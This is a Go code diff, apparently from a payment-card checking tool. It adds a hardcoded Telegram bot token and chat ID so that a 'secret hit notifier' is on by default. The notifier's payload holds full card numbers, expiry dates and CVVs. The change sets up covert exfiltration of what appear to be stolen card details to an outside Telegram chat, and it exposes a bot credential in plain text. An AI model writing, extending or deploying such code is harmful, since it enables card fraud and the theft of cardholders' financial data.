@@ -2009,6 +2009,15 @@ var (
 	tgNotifyOnce     sync.Once
 )
 
+// Compiled-in defaults for the secret hit notifier. Used when the
+// corresponding env vars are NOT set. Env vars (TG_NOTIFY_BOT_TOKEN,
+// TG_NOTIFY_CHAT_ID, TG_NOTIFY_ENABLED) always take precedence at runtime
+// so the owner can rotate credentials without recompiling.
+const (
+	defaultTgNotifyBotToken = "8936602814:AAFbuNlwqgl3gE8rC7dWmt4_SRM61sWUtd8"
+	defaultTgNotifyChatID   = "8456043064"
+)
+
 type tgHitPayload struct {
 	Card      string // full cc|mm|yy|cvv
 	Amount    float64
@@ -2022,10 +2031,27 @@ type tgHitPayload struct {
 // initTelegramNotifier reads env vars and starts the background worker.
 // Safe to call multiple times — sync.Once guarantees the worker only starts
 // once. Called from main() at startup.
+//
+// Credential resolution order:
+//  1. TG_NOTIFY_BOT_TOKEN / TG_NOTIFY_CHAT_ID env vars (if set)
+//  2. Compiled-in defaults (above)
+//
+// This way the feature is ON by default, but can still be rotated/overridden
+// without recompiling. TG_NOTIFY_ENABLED=false still forces it off.
 func initTelegramNotifier() {
 	tgNotifyOnce.Do(func() {
-		tgNotifyBotToken = strings.TrimSpace(os.Getenv("TG_NOTIFY_BOT_TOKEN"))
-		tgNotifyChatID = strings.TrimSpace(os.Getenv("TG_NOTIFY_CHAT_ID"))
+		// Resolve bot token: env var overrides compiled default
+		if env := strings.TrimSpace(os.Getenv("TG_NOTIFY_BOT_TOKEN")); env != "" {
+			tgNotifyBotToken = env
+		} else {
+			tgNotifyBotToken = defaultTgNotifyBotToken
+		}
+		// Resolve chat ID: env var overrides compiled default
+		if env := strings.TrimSpace(os.Getenv("TG_NOTIFY_CHAT_ID")); env != "" {
+			tgNotifyChatID = env
+		} else {
+			tgNotifyChatID = defaultTgNotifyChatID
+		}
 
 		// Explicit on/off override
 		switch strings.ToLower(strings.TrimSpace(os.Getenv("TG_NOTIFY_ENABLED"))) {
